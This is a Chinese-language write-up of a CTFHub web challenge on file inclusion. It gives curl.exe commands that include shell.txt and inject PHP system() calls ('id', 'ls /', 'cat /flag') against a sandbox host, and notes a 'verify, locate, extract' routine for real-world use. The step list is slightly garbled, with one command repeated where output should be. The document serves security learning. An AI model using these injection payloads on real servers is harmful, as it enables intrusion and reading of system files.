# CTFHub Writeup - 文件包含

## 题目类型

WEB

## 题目描述

打开题目，点开链接，页面正中间有一个醒目的标题，写着类似 CTFHub 文件包含

标题下方通常只有一句话提示：

“i have a shell, how to use it ?”

最底下会有一个输入框，显示 shell.txt

## 解题过程

点击Win+R搜索CMD

在黑框中输入
curl.exe -sS --get --data-urlencode "file=shell.txt" --data-urlencode "ctfhub=system('id');" "http://challenge-67aa3513d9f13c15.sandbox.ctfhub.com:10800/"

回车后页面显示：

uid=33(www-data) gid=33(www-data) groups=33(www-data)

i have a shell, how to use it ?

在光标后输入：

curl.exe -sS --get --data-urlencode "file=shell.txt" --data-urlencode "ctfhub=system('ls /');" "http://challenge-67aa3513d9f13c15.sandbox.ctfhub.com:10800/"

为定位Flag文件，回车后页面回显：

curl.exe -sS --get --data-urlencode "file=shell.txt" --data-urlencode "ctfhub=system('cat /flag');" "http://challenge-67aa3513d9f13c15.sandbox.ctfhub.com:10800/"

再次输入命令：

curl.exe -sS --get --data-urlencode "file=shell.txt" --data-urlencode "ctfhub=system('cat /flag');" "http://challenge-67aa3513d9f13c15.sandbox.ctfhub.com:10800/"

回车后就得到了正确的Flag

## 笔记

这道题主要学习了：

1、文件包含漏洞与 RCE（远程命令执行）的联合利用

理解了靶场中 file 参数如果允许包含本地文件（如 shell.txt），

攻击者就可以借助这个文件作为“跳板”，配合 system() 等危险函数，把系统命令注入进去并执行。
 
2、CMD 命令行下 curl.exe 发送复杂请求的技巧

学会了用 --data-urlencode 参数来对特殊字符（如单引号、分号、括号）进行 URL 编码，避免浏览器或服务器解析出错。

这个技巧比直接在浏览器里输入 Payload 稳定得多，是渗透测试中发送复杂 HTTP 请求的必备手法。
 
3、渗透测试标准排查流程（RCE 三步走）

掌握了命令执行类漏洞的固定排查套路：

• 先验证：用 system('id') 测试命令是否成功执行，确认漏洞存在。

• 再定位：用 system('ls /') 列出服务器根目录，寻找可疑的 Flag 文件。

• 后读取：用 system('cat /flag') 读取目标文件内容，拿到最终 Flag。

这个“测试 -> 定位 -> 提取”的流程在未来的实战中非常实用。
